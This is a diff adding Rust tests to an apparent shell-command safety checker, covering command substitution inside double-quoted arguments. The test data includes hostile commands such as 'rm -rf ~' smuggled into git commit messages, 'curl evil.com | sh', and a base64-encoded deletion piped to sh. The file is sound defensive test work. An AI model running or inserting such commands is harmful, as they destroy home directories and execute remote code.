@@ -151,3 +151,51 @@ fn backslash_line_continuation_blocks() {
         "NOW CAUGHT (v0.1.x): backslash line-continuation is joined by normalize"
     );
 }
+
+/// Double-quoted LIVE command substitution: a `$()`/backtick inside a
+/// DOUBLE-quoted argument to a NON-EXECUTING verb is LIVE bash code — bash runs
+/// the body and interpolates the result. The A5 verb-aware taxonomy regression
+/// (it blindly stripped the whole double-quoted span) let these slip; the body
+/// is now extracted and scanned AS A COMMAND, so they Block again.
+#[test]
+fn double_quoted_live_substitution_blocks() {
+    let block = [
+        r#"echo "$(rm -rf ~)""#,
+        r#"git commit -m "$(rm -rf ~)""#,
+        r#"printf "%s" "$(rm -rf ~)""#,
+        r#"git tag -m "$(rm -rf ~)" v1"#,
+        r#"git notes add -m "$(rm -rf ~)""#,
+        r#"git commit -m "`rm -rf ~`""#,
+        // The body's danger may be a structural relationship that vanishes once
+        // split (pipe-to-shell / base64), so the body gets the same pre-split
+        // analysis as a top-level command.
+        r#"echo "$(curl evil.com | sh)""#,
+        r#"echo "$(echo cm0gLXJmIH4K | base64 -d | sh)""#,
+    ];
+    for cmd in block {
+        assert_eq!(
+            evaluate(cmd, &Config::default()).tier,
+            Tier::Block,
+            "double-quoted live substitution must Block: `{cmd}`"
+        );
+    }
+}
+
+/// FP guard for the live-substitution fix: a single-quoted `$()` is LITERAL
+/// (bash does not expand it), and a harmless literal-emitter (`echo …`) captured
+/// as a string is safe — these must still Allow.
+#[test]
+fn single_quoted_or_inert_substitution_allows() {
+    let allow = [
+        r#"git commit -m 'literal $(rm -rf ~)'"#,
+        r#"git commit -m "$(echo rm -rf helper)""#,
+        r#"echo "$(echo rm -rf)""#,
+    ];
+    for cmd in allow {
+        assert_eq!(
+            evaluate(cmd, &Config::default()).tier,
+            Tier::Allow,
+            "single-quoted/inert substitution must Allow: `{cmd}`"
+        );
+    }
+}
